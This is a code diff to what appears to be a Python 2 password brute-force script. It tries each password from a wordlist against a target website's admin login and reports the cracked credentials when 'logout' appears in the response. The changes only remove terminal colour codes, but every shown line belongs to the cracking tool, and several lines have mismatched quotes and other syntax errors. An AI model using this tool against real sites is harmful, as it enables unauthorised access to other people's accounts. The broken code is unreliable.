@@ -28,7 +28,7 @@ print (banner)
 time.sleep(1.0)
 
 if len(sys.argv) != 4:
-	print ('\033[38;5;21m[\033[1;95m+\033[38;5;21m]\033[1;92m Usage: " + sys.argv[0] + " www.target.com admin pass.txt')
+	print ('Usage:' + sys.argv[0] + ' www.target.com admin pass.txt')
 	sys.exit(0)
 
 url = sys.argv[1]
@@ -60,14 +60,14 @@ def bruter(passwd,fi):
 		neo = coder.open(data).read()
 		if 'logout' in neo:
 			t2 = time.time()
-			print (\033[1;97mDomain Name: %s" % url )
-			print (\033[1;95mUsername: %s" % usr )
-			print (\033[1;95m5Password Cracked: %s" % passwd )
-			print (\033[1;97mTime: %s" % str(t2-t1))
+			print ('Domain Name: %s' % url )
+			print ('Username: %s' % usr )
+			print ('Password Cracked: %s' % passwd )
+			print ('Time: %s' % str(t2-t1))
 			_exit(1)
 
 		else:
-			print (\033[38;5;197m[\033[38;5;21m*\033[38;5;197m] \033[1;93mTrying \033[1;90m---==>\033[38;5;48m %s" % passwd)
+			print ('Trying ---==> %s' % passwd')
 
 	except Exception, e:
 		print e
